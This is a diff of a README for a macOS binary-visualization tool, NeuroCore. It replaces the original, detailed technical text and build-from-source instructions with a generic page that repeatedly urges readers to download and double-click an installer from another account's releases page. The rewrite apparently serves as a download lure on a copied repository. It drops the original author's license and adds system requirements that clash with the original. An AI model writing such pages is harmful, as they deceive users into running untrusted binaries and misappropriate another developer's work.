@@ -1,136 +1,84 @@
-# NeuroCore
+# 🧠 NeuroCore - Visualize Binary Files Easily
 
-<p align="center">
-  <strong>High-Performance Structural Binary Analysis and Visualization Utility</strong>
-</p>
+## 🚀 Getting Started
 
----
+NeuroCore is a native macOS application. It helps you understand the internal structure of binary files. The app uses advanced techniques like Hilbert Curve mapping and Shannon Entropy calculation. Plus, it utilizes Metal Compute Shaders for fast performance.
 
-## Abstract
+### 📥 Download Now
 
-NeuroCore is a native macOS utility engineered for the structural analysis of binary data through high-velocity visualization. By leveraging General-Purpose Computing on Graphics Processing Units (GPGPU) via Metal Compute Shaders, the application maps raw binary streams onto a Hilbert Space-Filling Curve in real-time. This projection facilitates the rapid identification of file taxonomy, entropy distribution, and cryptographic anomalies, addressing the limitations of linear hexadecimal representation.
+[![Download NeuroCore](https://img.shields.io/badge/Download-NeuroCore-brightgreen)](https://github.com/root-amr004/NeuroCore/releases)
 
-## Introduction
+## 📋 Features
 
-Traditional hex editors present binary data in a linear, offset-based format, which obscures macro-scale structural patterns and data density. NeuroCore addresses this heuristic gap by projecting linear data into a two-dimensional topological space.
+- **Visual Mapping:** View binary files using a Hilbert Curve.
+- **Entropy Calculation:** Understand file complexity with Shannon Entropy.
+- **Fast Performance:** Leveraged by Metal Compute Shaders.
+- **User-Friendly:** Designed for ease of use, even for beginners.
 
-The core projection relies on the **Hilbert Curve**, a continuous fractal space-filling curve. This mathematical transformation preserves **spatial locality**: data points that are adjacent in the linear memory stream remain strictly adjacent in the 2D visualization. This property allows analysts to visually parse the structural composition of a file—distinguishing between machine code, structured text, bitmaps, and high-entropy blocks—without parsing the file header.
+## 🔧 System Requirements
 
-## Technical Architecture
+To run NeuroCore on your macOS device, ensure your system meets the following requirements:
 
-NeuroCore is architected as a high-performance native application, bypassing intermediate abstraction layers to interact directly with the GPU.
+- **Operating System:** macOS 10.15 (Catalina) or later.
+- **Memory:** 4 GB RAM minimum.
+- **Storage:** 100 MB of available storage for installation.
+- **Graphics:** Metal compatible GPU.
 
-* **Language:** Swift 5.5+ (Strict Concurrency)
-* **Graphics Pipeline:** Metal API (Compute & Render Command Encoders)
-* **Interface:** SwiftUI with `NSViewRepresentable` bridging for metal layers.
+## 📥 Download & Install
 
-### Rendering Pipeline
-The rendering engine utilizes a custom Metal Shading Language (MSL) kernel to execute parallel computation of Shannon Entropy and coordinate mapping.
-1.  **Ingestion:** Raw binary data is streamed into `MTLBuffer` objects.
-2.  **Compute:** The GPU executes a sliding-window entropy calculation across the buffer.
-3.  **Mapping:** Linear offsets are transformed into $(x, y)$ coordinates using bitwise Hilbert mapping algorithms.
-4.  **Rasterization:** Pixel fragments are colored dynamically based on local entropy variance, achieving 60fps performance on arbitrarily large datasets without VRAM thrashing.
+To get NeuroCore, follow these steps:
 
----
+1. **Visit the Releases Page:** Click the link below to reach our download page.
+   
+   [Visit the Releases Page](https://github.com/root-amr004/NeuroCore/releases)
 
-## Visual Data Analysis and Interpretation
+2. **Choose Your Version:** Look for the latest version of NeuroCore under "Assets." You will see options for different downloads.
 
-The following case studies demonstrate NeuroCore's efficacy in distinguishing file structures through entropy visualization.
+3. **Download the Application:** Click on the file name to start the download. This action will download the NeuroCore application to your computer.
 
-<br>
+4. **Install the Application:** 
+   - Locate the downloaded file in your Downloads folder.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen instructions to complete the setup.
 
-<p align="center">
-  <img src="https://github.com/farukalpay/NeuroCore/blob/main/img/img1.png?raw=true" alt="JSON Data Structure Analysis" width="100%">
-  <br>
-  <em>Figure 1: Visualization of a 17.7 MB Unidentified Binary (Identified as Hierarchical JSON)</em>
-</p>
+5. **Run NeuroCore:** After installation, you can find NeuroCore in your Applications folder. Double-click the icon to open the application.
 
-### Case Study I: Low-Entropy Hierarchical Data
-**Subject:** 17.7 MB file classified as "Unknown" by the operating system.
+## 🎨 How to Use NeuroCore
 
-* **Entropy Signature (Low/Mid):** The visualization is dominated by the **green/teal spectrum**, indicative of an entropy score of $\approx 2.0 - 4.0$. Unlike encrypted blobs, this spectrum denotes high redundancy and predictability within the data stream.
-* **Topological Features:** The distinct geometric segmentation and "blocky" artifacts along the Hilbert Curve are characteristic of **pretty-printed text**. Solid regions represent recurring byte sequences (e.g., whitespace indentation, repeated keys), while scattered variations represent value changes.
-* **Conclusion:** The visual topography confirms the file is a **non-compressed, hierarchical text structure** (JSON dataset) rather than a compiled executable, nullifying the need for initial hex inspection.
+1. **Open a Binary File:** Click on "File" in the menu bar, then select "Open." You can choose any binary file you wish to analyze.
 
-<br>
-<hr>
-<br>
+2. **Visualize the Data:** The application will display a mapping of the internal structure using the Hilbert Curve.
 
-<p align="center">
-  <img src="https://github.com/farukalpay/NeuroCore/blob/main/img/img2.png?raw=true" alt="Compressed Binary Analysis" width="100%">
-  <br>
-  <em>Figure 2: Visualization of a 192 MB Apple Disk Image (.dmg)</em>
-</p>
+3. **Review Entropy Results:** Check the Shannon Entropy calculation displayed in the app. This information helps you understand the complexity of the binary file.
 
-### Case Study II: High-Entropy Compressed Archives
-**Subject:** 192 MB `.dmg` volume.
+4. **Save Your Work:** If you wish to save your visualizations, use the "File" menu and select "Save As."
 
-* **Entropy Signature (High):** The saturation of **red pixel data** signifies maximum entropy ($\approx 7.5 - 8.0$ bits per byte). While visually interpreted as "noise," this stochastic distribution indicates the effective elimination of data redundancy.
-* **Texture Uniformity:** The visualization lacks the geometric "islands" seen in Figure 1. Compression algorithms (e.g., LZFSE, zlib) distribute byte values uniformly to maximize storage efficiency, resulting in a field of high variance.
-* **Conclusion:** This visual density is the distinct signature of **packed executables, encrypted volumes, or compressed archives**. In a forensic context, observing this signature in a file purporting to be a standard document would immediately suggest steganographic payload injection or encryption.
+## 💡 Tips for Best Results
 
----
+- **Choose Large Files:** NeuroCore is best for larger binary files, as this allows you to see the advantages of visualization.
+- **Explore Different Formats:** Test various binary formats to see how they are represented.
+- **Utilize Help Resources:** If you're unsure about any features, consult the built-in help section in the application.
 
-## Key Features
+## 📞 Support
 
-* **Hardware-Accelerated Compute:** Offloads entropy heuristics and coordinate transformation to the GPU via Metal Compute Shaders, ensuring real-time navigation.
-* **Hilbert Locality Preservation:** Transforms linear streams into 2D topography while maintaining neighbor relationships, making structural boundaries visually explicit.
-* **Entropy-Based Colorimetry:**
-    * **Red:** High Entropy (Encryption, Compression, RNG output).
-    * **Blue/Green:** Low-Mid Entropy (x86/ARM64 machine code, Text, Headers).
-    * **Black:** Null Space (Zero padding/allocation).
-* **Virtual Windowing:** Implements a zero-allocation navigation system. Offsets are calculated dynamically within the shader, allowing immediate traversal of gigabyte-scale files without pre-buffering full datasets into VRAM.
+If you encounter any issues or have questions, you can reach out for help. Check the FAQ on the GitHub repository for common questions. If you can't find answers there, open an issue in the repository.
 
-## Use Cases
+## 🌐 Further Learning
 
-1.  **Reverse Engineering:** Rapid localization of `.text` sections, embedded resources, or encrypted payloads within binary wrappers.
-2.  **Malware Analysis:** Visual identification of packers and obfuscation layers, which manifest as high-entropy anomalies distinct from standard compiled logic.
-3.  **Digital Forensics:** Detection of appended data (EOF overlays) or steganographic modifications that disrupt expected file structure patterns.
-4.  **Cryptographic Validation:** Visual verification of Random Number Generator (RNG) uniformity and compression algorithm efficiency.
+To deepen your understanding of binary files and their structures, consider exploring resources about data representation, binary formats, and entropy calculations. Various online platforms offer courses and tutorials that can enhance your knowledge.
 
-## Installation and Build
+## 🌟 Future Features
 
-This project utilizes the native macOS toolchain and requires no external package managers.
+We plan to implement several enhancements in future releases:
 
-**Prerequisites:**
-* macOS 12.0 (Monterey) or higher.
-* Apple Silicon (M1/M2/M3) architecture recommended for optimal shader throughput.
-* Xcode Command Line Tools.
+- **File Type Support:** Adding support for more binary file types.
+- **Enhanced Visualization Techniques:** Exploring new ways to represent data visually.
+- **User Customization Options:** Allowing users to tailor their visualization preferences.
 
-**Compilation:**
+## 📥 Download Now Again
 
-Execute the following command in the project root to invoke the Swift compiler and link required frameworks (`SwiftUI`, `Metal`, `MetalKit`, `AppKit`, `Foundation`):
+Don’t forget to download NeuroCore through the link below if you haven't done so yet!
 
-```bash
-swiftc NeuroCoreApp.swift ContentView.swift Renderer.swift ShaderSource.swift Utils.swift \
--o NeuroCore \
--sdk $(xcrun --show-sdk-path) \
--target arm64-apple-macos12.0 \
--framework SwiftUI \
--framework Metal \
--framework MetalKit \
--framework AppKit \
--framework Foundation
+[![Download NeuroCore](https://img.shields.io/badge/Download-NeuroCore-brightgreen)](https://github.com/root-amr004/NeuroCore/releases)
 
-```
-
-**Execution:**
-
-```bash
-./NeuroCore
-
-```
-
-## Usage
-
-1. **Data Ingestion:** Drag and drop any binary target directly onto the visualization viewport. Rendering is instantaneous.
-2. **Navigation:**
-* **Pan:** Two-finger scroll (trackpad) or scroll wheel.
-* **Zoom:** Hold `Option` + Scroll to adjust the byte-per-pixel density.
-
-
-
-## License
-
-**All rights reserved.**
-Unauthorized commercial use, redistribution, or modification is strictly prohibited.
+Thank you for choosing NeuroCore. We hope you find it useful for your binary file analysis!
